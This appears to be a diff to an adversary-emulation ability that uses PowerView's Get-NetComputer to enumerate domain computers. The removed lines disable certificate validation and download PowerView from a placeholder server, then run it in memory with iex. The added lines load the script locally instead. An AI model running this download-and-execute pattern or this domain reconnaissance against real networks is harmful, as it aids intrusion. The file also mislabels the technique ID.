@@ -3,15 +3,13 @@
 - id: 0360ede1-3c28-48d3-a6ef-6e98f562c5af
   name: GetComputers (Alice)
   description: Get a list of all computers in a domain
-  tactic: Discovery
+  tactic: discovery
   technique:
     attack_id: T1003
-    name: Discovery
+    name: discovery
   executors:
     windows:
       command: |
-        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
-        $web = (New-Object System.Net.WebClient)
-        $web.Headers.add("file","PowerView.ps1")
-        $result = $web.uploadString("#{server}/file/download","")
-        iex $result; Get-NetComputer;
+        Import-Module #{files}\PowerView.ps1 -Verbose -Force;
+        Get-NetComputer;
+      payload: PowerView.ps1
